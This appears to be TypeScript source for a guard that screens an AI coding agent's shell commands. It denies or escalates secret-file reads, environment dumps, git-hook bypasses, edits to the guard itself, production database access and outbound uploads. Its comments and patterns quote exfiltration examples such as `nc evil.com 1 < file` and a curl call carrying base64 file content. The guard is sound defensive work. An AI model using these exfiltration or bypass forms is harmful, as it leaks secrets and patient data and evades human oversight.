/** `find . -type f -exec cat {} +`: every file under the start paths is read, live env files included. */
function findReadVerdict(
  prog: string,
  args: readonly string[],
  cwd: Cwd,
  ctx: BashContext,
): BashVerdict | null {
  if (prog !== "find") return null;
  const readers = findExecCommands(args).filter((run) => {
    const p = parseSegment(run.command);
    return FILE_READER.test(p.prog);
  });
  if (readers.length === 0) return null;
  // A name test for a source-file type limits it, as `--include=*.ts` limits grep.
  const named = args.some((a, k) => /^-i?name$/.test(a) && SAFE_INCLUDE.test(args[k + 1] ?? ""));
  if (named) return null;
  let k = 0;
  while (/^-[HLP]$/.test(args[k] ?? "")) k++;
  const starts: string[] = [];
  for (; k < args.length && !/^(-|\\?\(|!)/.test(args[k] ?? ""); k++) starts.push(args[k] ?? "");
  const reaches = (starts.length > 0 ? starts : ["."]).some((start) => {
    const rel = resolvePath(start, cwd, ctx);
    return (
      rel === null ||
      rel === "" ||
      (!rel.startsWith("/") && !rel.startsWith("~") && reachesLiveEnv(rel, liveEnvExists(ctx)))
    );
  });
  return reaches
    ? ask(
        "`find … -exec cat|grep {}` reads every file under it, live env files included. Name the files you need, or limit it with -name '*.ts'.",
      )
    : null;
}

function recursiveSearchVerdict(
  prog: string,
  args: readonly string[],
  cwd: Cwd,
  ctx: BashContext,
): BashVerdict | null {
  const grep = /^(grep|egrep|fgrep)$/.test(prog);
  if (!grep && prog !== "rg") return null;
  if (grep) {
    const recursive = args.some(
      (a, k) =>
        clusterHas(a, "rR") ||
        isLongOption(a, "recursive", 3) ||
        isLongOption(a, "dereference-recursive", 3) ||
        a === "--directories=recurse" ||
        (a === "-d" && args[k + 1] === "recurse"),
    );
    const globs = args.flatMap((a, k) =>
      a.startsWith("--include=")
        ? [a.slice("--include=".length)]
        : a === "--include"
          ? [args[k + 1] ?? ""]
          : [],
    );
    if (!recursive || (globs.length > 0 && globs.every((g) => SAFE_INCLUDE.test(g)))) return null;
  } else if (
    !args.some(
      (a) =>
        clusterHas(a, "u.", RG_SHORT_FLAGS) || /^--(unrestricted|hidden|no-ignore(-.*)?)$/.test(a),
    )
  ) {
    return null;
  }
  const paths = grep
    ? searchPaths(args, GREP_VALUE_LETTERS, GREP_VALUE_LONG)
    : searchPaths(args, RG_VALUE_LETTERS, RG_VALUE_LONG);
  // The root, a directory the guard cannot place, or one that holds a live env file (`deploy/production`, `apps`).
  const sweepsSecrets = (rel: string | null): boolean =>
    rel === null || rel === "" || reachesLiveEnv(rel, liveEnvExists(ctx));
  const atRoot =
    paths.length === 0
      ? sweepsSecrets(cwd)
      : paths.some((p) => sweepsSecrets(resolvePath(p, cwd, ctx)));
  if (!atRoot) return null;
  return ask(
    grep
      ? "`grep -r` ignores .gitignore, so over the repo root it reads every live .env file under it. Search the directory you need, or use `rg` (which skips ignored files)."
      : "`rg` with -u, --no-ignore or --hidden stops skipping ignored files, so over the repo root it reads every live .env file under it. Search the directory you need, or drop the flag.",
  );
}

/** `tar c`/`zip` of the repo root packs every live .env into one blob that can be piped anywhere. */
function archiveRootVerdict(
  prog: string,
  args: readonly string[],
  cwd: Cwd,
  ctx: BashContext,
): BashVerdict | null {
  if (!TAR.test(prog) && prog !== "zip") return null;
  let creating = prog === "zip";
  let dir: string | undefined;
  const operands: string[] = [];
  for (let k = 0; k < args.length; k++) {
    const a = args[k] ?? "";
    const cluster =
      TAR.test(prog) && /^-?[A-Za-z]+$/.test(a) && (k === 0 || a.startsWith("-"))
        ? a.replace(/^-/, "")
        : "";
    if (TAR.test(prog) && (a === "-C" || a === "--directory")) dir = args[++k];
    else if (a === "--create") creating = true;
    else if (cluster) {
      creating ||= cluster.includes("c");
      if (cluster.includes("f")) k++;
    } else if (!a.startsWith("-")) operands.push(a);
  }
  const base = dir === undefined ? cwd : resolvePath(dir, cwd, ctx);
  const names = prog === "zip" ? operands.slice(1) : operands;
  const root = names.some((o) => {
    const rel = base === null ? (/^\.\/?$/.test(o) ? "" : undefined) : resolvePath(o, base, ctx);
    return (
      rel === "" ||
      (typeof rel === "string" &&
        !rel.startsWith("/") &&
        !rel.startsWith("~") &&
        reachesLiveEnv(rel, liveEnvExists(ctx)))
    );
  });
  if (!creating || !root) return null;
  return ask(
    "Archiving the repo root, or a directory that holds live env files, packs them into one blob. Archive the files you need.",
  );
}

function classifySegment(
  seg: string,
  parsed: Parsed,
  ctx: BashContext,
  here: readonly Cwd[],
): BashVerdict | null {
  const { prog, args, assigns, outs, ins } = parsed;
  const argline = args.join(" ");

  if (prog === "git") {
    const { sub, rest, configs, dirs, unknownGlobal } = gitInvocation(args);
    // Fail-closed prompts are held until the denies below have had their say.
    let pending: BashVerdict | null = null;
    if (unknownGlobal) {
      pending = ask(
        `Unrecognised git global option ${echo(unknownGlobal)} before the subcommand; it may hide a push or commit, so a human decides.`,
      );
    } else if (assigns.some((a) => GIT_ENV_OVERRIDE.test(a))) {
      pending = ask(
        "A GIT_* environment override (GIT_CONFIG_*, GIT_SSH_COMMAND, GIT_EXTERNAL_DIFF, GIT_PAGER, ...) changes what git runs or reads; a human decides.",
      );
    }
    // Git accepts any unambiguous abbreviation (`--no-verif`, `--no-ver`, `--no-v`), so match the prefix.
    if (/\s--no-v[a-z-]*(?=\s|=|$)/.test(` ${argline}`)) {
      return deny(
        "`--no-verify` skips the repo's git hooks (the fitness gate and secret scan). Fix what the hook reports instead; a human can bypass deliberately outside the agent.",
      );
    }
    if (configs.some((kv) => GIT_EXEC_CONFIG.test(configKey(kv)))) {
      return deny(
        "`git -c` / `--config-env` setting core.hooksPath, core.fsmonitor, core.sshCommand, a pager, editor, helper or alias disables the repo's hooks or runs an arbitrary program for this one command.",
      );
    }
    if (!pending && configs.some((kv) => !GIT_SAFE_CONFIG.test(configKey(kv)))) {
      pending = ask(
        "`git -c` / `--config-env` sets a key outside the presentation-only allowlist (color.*, advice.*, core.quotepath); a human decides.",
      );
    }
    if (
      (sub === "diff" || sub === "log" || sub === "show") &&
      rest.some((a) => /^--(output|ext-diff)\b/.test(a))
    ) {
      return deny(
        "`--output` writes a file and `--ext-diff` runs an external program; neither is the read-only diff/log/show the allow-list is for.",
      );
    }
    if (sub === "branch" && !gitBranchIsReadOnly(rest)) {
      return deny(
        "This `git branch` form is not a listing: it can create, move, copy, delete or re-point a branch. Only --list, -a, -r, -v, --show-current, --contains/--merged/--format and similar are allowed.",
      );
    }
    if (sub === "commit") {
      // `-n` is commit's short form of --no-verify, also inside clusters like `-anm`; skip -m/-F values.
      for (let k = 0; k < rest.length; k++) {
        const a = rest[k] ?? "";
        if (/^-(m|F|C|c|t)$/.test(a) || /^--(message|file|reuse-message|template)$/.test(a)) {
          k++;
          continue;
        }
        if (
          /^-[a-zA-Z]+$/.test(a) &&
          a.includes("n") &&
          !/^-[a-zA-Z]*m/.test(a.replace(/n.*$/, ""))
        ) {
          return deny(
            "`git commit -n` is --no-verify: it skips the pre-commit secret and PHI scan.",
          );
        }
      }
    }
    if (
      sub === "config" &&
      /core\.hooksPath/.test(argline) &&
      !/(--get|--list|-l)\b/.test(argline) &&
      !/core\.hooksPath\s+\.githooks\b/.test(argline)
    ) {
      return deny("Re-pointing core.hooksPath disables the repo's git hooks.");
    }
    if (sub === "push") {
      const refs = rest.filter((a) => !a.startsWith("-")); // remote, then refspecs
      const remoteRefs = refs.slice(1);
      const targetsMain =
        remoteRefs.some((r) => /^\+?([^:]*:)?(refs\/heads\/)?main$/.test(r)) ||
        (ctx.branch === "main" &&
          (remoteRefs.length === 0 || remoteRefs.some((r) => /^\+?HEAD$/.test(r))));
      const forced =
        /\s(--force|-f|--force-with-lease)\b/.test(` ${argline}`) ||
        remoteRefs.some((r) => r.startsWith("+"));
      if (targetsMain && forced) {
        return deny(
          "Force-pushing main rewrites the change record (see audit/FORCE_PUSH_RECOVERY_AUDIT_2026-09-25.md).",
        );
      }
      if (targetsMain) {
        return ask(
          "Pushing to main auto-deploys and costs a CI matrix run. Confirm the human has approved this push, and that rounds are batched.",
        );
      }
    }
    const writer = gitWriteVerdict(sub, rest, dirs, here, ctx);
    if (writer) return writer;
    if (pending) return pending;
  }

  // --- Nested agents started with the guard off.
  const nested = nestedAgentVerdict(prog, args, assigns, here);
  if (nested) return nested;

  // --- The keychain, a CLI's stored token, `printenv SECRET`, `docker inspect`.
  const stored = storedSecretVerdict(prog, args);
  if (stored) return stored.decision === "deny" ? deny(stored.reason) : ask(stored.reason);

  // --- Environment dumps and secret variables echoed into the transcript.
  if (
    /^(printenv|env|set|export|declare)$/.test(prog) &&
    (args.length === 0 || /^(-p|-x)$/.test(args[0] ?? ""))
  ) {
    return deny(
      "Dumping the environment would put DATABASE_URL and vendor secrets into the transcript. Print the one non-secret variable you need, by name.",
    );
  }
  if (/\/proc\/[^\s]*\/environ/.test(seg))
    return deny("Reading a process environment exposes its secrets.");
  if (/^(echo|printf|cat)$/.test(prog) && SECRET_VAR.test(argline)) {
    return deny(
      'Echoing a secret-bearing variable puts it in the transcript. Check presence with `[ -n "$VAR" ] && echo set` instead.',
    );
  }

  // --- docker compose: lifecycle commands may use --env-file; `config` prints resolved secrets.
  const isCompose = prog === "docker-compose" || (prog === "docker" && args[0] === "compose");
  if (isCompose) {
    const sub =
      args.filter(
        (a, k) => !a.startsWith("-") && !/^-/.test(args[k - 1] ?? "") && a !== "compose",
      )[0] ?? "";
    if (/(^|\s)--env-file\b/.test(argline) && !COMPOSE_SAFE.test(sub)) {
      return deny(
        `\`docker compose ${echo(sub)}\` with --env-file can print resolved secrets (\`config\` does). Lifecycle commands (up, down, run, exec, logs…) are fine.`,
      );
    }
    // `config` prints the file with every ${VAR} resolved, secrets included; the name-only forms do not.
    const namesOnly = /^(-q|--quiet|--services|--images|--profiles|--volumes|--hash)(=|$)/;
    if (/^(config|convert)$/.test(sub) && !args.some((a) => namesOnly.test(a))) {
      return ask(
        "`docker compose config` prints the resolved configuration with every secret from the environment filled in. Use `config --quiet` to validate, or `--services`/`--images` for names.",
      );
    }
  }

  // --- A file name the guard cannot evaluate, handed to a program that prints files.
  const indirect = dynamicReaderVerdict(prog, args, ins);
  if (indirect) return indirect;

  // --- Secret files read through the shell (the Read tool is blocked separately).
  if (
    !READ_ONLY_CHECK.test(prog) &&
    !(prog === "git" && /^(status|check-ignore|ls-files|add|rm|mv)$/.test(args[0] ?? ""))
  ) {
    for (const t of [...fileArgs(args), ...fileArgs(ins), ...fileArgs(outs)]) {
      if (isCompose && SECRET_BY_NAME.test(t)) continue; // --env-file value for a lifecycle command
      if (globReachesSecret(t)) {
        return deny(
          `\`${echo(t)}\` expands onto a live secret file (.env, key material). Name the file you need, and not a secret one.`,
        );
      }
      const why = secretPathReason(t);
      if (!why) continue;
      // A bare word is a file only if one of that name exists where the command runs; a path or a `.env` name is
      // judged as written.
      const pathLike =
        SECRET_BY_NAME.test(t) ||
        t.includes("/") ||
        namesFileIn(t, here, ctx, FILE_READER.test(prog));
      if (pathLike) {
        return deny(
          `\`${echo(t)}\` is ${why}. Agents do not read secrets or dumps; use .env.example for shape, and ask the human for any value you truly need.`,
        );
      }
    }
  }

  // --- Whole-tree reads that go around .gitignore, and archives of the repo root: from every directory the
  // command may be in, so a `cd` that may not have applied cannot move the sweep off the root.
  for (const dir of here) {
    const sweep =
      recursiveSearchVerdict(prog, args, dir, ctx) ??
      archiveRootVerdict(prog, args, dir, ctx) ??
      copyOutVerdict(prog, args, dir, ctx) ??
      findReadVerdict(prog, args, dir, ctx);
    if (sweep) return sweep;
  }

  // --- Inline interpreter code that names a secret file: `python -c "open('.env').read()"`.
  if (runsInlineCode(prog, args)) {
    const code = scriptTextVerdict(inlineScriptText(prog, args));
    if (code?.decision === "deny") return code;
  }

  // --- The harness protecting itself: no shell edit of its own guard, ledger or approved lists.
  if (prog === "patch" && !args.includes("--dry-run")) {
    return ask(
      "`patch` applies a diff the guard cannot read; it may rewrite the guard, the hooks or the compliance record. A human decides.",
    );
  }
  const protectedHit = writesProtectedPath(parsed, here, ctx);
  if (protectedHit) {
    return ask(
      protectedHit.path === null
        ? UNKNOWN_DIR_REASON
        : protectedHit.path === ""
          ? ROOT_WIDE_REASON
          : protectedReason(protectedHit.path),
    );
  }
  if (runsInlineCode(prog, args)) {
    const code = scriptTextVerdict(inlineScriptText(prog, args));
    if (code) return code;
  }

  // --- Production data access. An agent session connecting to a non-local database is PHI access.
  if (/^(psql|pg_dump|pg_dumpall|pg_restore|pgcli)$/.test(prog)) {
    const hostFlag = /(?:^|\s)(?:-h\s*|--host[=\s])([^\s'"]+)/.exec(argline)?.[1];
    const urlHost = /postgres(?:ql)?:\/\/[^@\s]*@([^/:\s?'"]+)/.exec(argline)?.[1];
    const envHost = assigns.map((a) => /^PGHOST=(.*)$/.exec(a)?.[1]).find(Boolean);
    const host = hostFlag ?? urlHost ?? envHost;
    if (host && !isLocalHost(host)) {
      return deny(
        `Connecting to database host \`${echo(host)}\` from an agent session is access to PHI. Agents work against local or private-container databases with synthetic data only.`,
      );
    }
    if (!host && /\$\{?[A-Z_]*DATABASE_URL/.test(argline)) {
      return ask(
        "`$DATABASE_URL` could point anywhere. Confirm it is a local or private-container database with synthetic data.",
      );
    }
  }

  // --- Remote shells: production access must be a human decision every time.
  if (/^(ssh|scp|sftp|rsync)$/.test(prog)) {
    const target =
      prog === "ssh"
        ? fileArgs(sshHost(args) === undefined ? [] : [sshHost(args) as string])[0]
        : fileArgs(args).find((a) => a.includes("@") || a.includes(":"));
    // Drop `user:password@` first: the userinfo is not the host, and must not be echoed as one.
    const m =
      /(?:^|\s)(?:[A-Za-z0-9._-]+@)?([A-Za-z0-9.-]+\.[A-Za-z]{2,}|\d{1,3}(?:\.\d{1,3}){3}|[A-Za-z0-9_-]+)(?::|\s|$)/.exec(
        (target ?? "").replace(/^[^/]*@/, ""),
      );
    const host = m?.[1] ?? "";
    if (prog === "ssh" && target !== undefined && DYNAMIC_HOST.test(target)) {
      return ask(
        "`ssh` to a host that a variable or command substitution builds, so the guard cannot tell whether it is production. Name the host.",
      );
    }
    if (host && !isLocalHost(host)) {
      return ask(
        `Remote access to \`${echo(host)}\`. Production hosts hold PHI; confirm this is intended and that no PHI will enter the session.`,
      );
    }
  }

  // --- Outbound uploads: the exfiltration shape.
  if (/^(curl|wget|http|https|httpie)$/.test(prog)) {
    // The host is what FOLLOWS the userinfo: `http://localhost@evil.example/` goes to evil.example.
    const host = /https?:\/\/(?:[^/\s'"]*@)?([^/:\s'"]+)/.exec(argline)?.[1] ?? "";
    const upload =
      /(\s-d\b|\s--data(-[a-z]+)?\b|\s-F\b|\s--form\b|\s-T\b|\s--upload-file\b|\s-X\s*(POST|PUT|PATCH)\b|--post-(data|file))/i.test(
        ` ${argline}`,
      );
    if (!isLocalHost(host)) {
      if (upload) {
        return ask(
          `Sending data to \`${echo(host) || "a remote host"}\`. Confirm the payload carries no PHI or secrets.`,
        );
      }
      // A plain GET can still carry data out in its URL or headers: `curl https://x/?d=$(base64 < f)`.
      if (/\$\(|`|\$\{?[A-Za-z_]/.test(seg)) {
        return ask(
          `A request to \`${echo(host) || "a remote host"}\` that expands shell values or command output into it can carry PHI or secrets out. Confirm what is sent.`,
        );
      }
    }
  }
  // Raw sockets: nothing in `nc evil.com 1 < file` looks like an upload to the checks above.
  if (/^(nc|ncat|netcat|telnet|socat)$/.test(prog)) {
    const host =
      prog === "socat"
        ? (/(?:TCP|SSL|OPENSSL)[46]?:([^:\s,]+)/i.exec(argline)?.[1] ?? "")
        : (fileArgs(args).find((a) => !/^\d+$/.test(a)) ?? "");
    if (!isLocalHost(host)) {
      return ask(
        `Opening a raw connection to \`${echo(host) || "a remote host"}\`. Confirm nothing from the repo or the environment is sent.`,
      );
    }
  }
  if (prog === "openssl" && args[0] === "s_client") {
    const host = /-connect\s+([^:\s]+)/.exec(argline)?.[1] ?? "";
    if (!isLocalHost(host)) {
      return ask(
        `Opening a TLS connection to \`${echo(host) || "a remote host"}\`. Confirm what is sent.`,
      );
    }
  }

  // --- Live suites drop cluster roles: they must run against a private container (CLAUDE.md).
  if (
    (prog === "bun" && /^run\s+test:[^\s]*:live\b/.test(argline)) ||
    (/^(vitest|bunx|npx)$/.test(prog) && /\.live\.test/.test(argline))
  ) {
    return ask(
      "Live suites DROP ROLE chartwarden_app. Confirm DATABASE_URL points at a private chartwarden-postgres:dev container (own port, fresh database), never the shared Docker cluster.",
    );
  }
  return null;
}
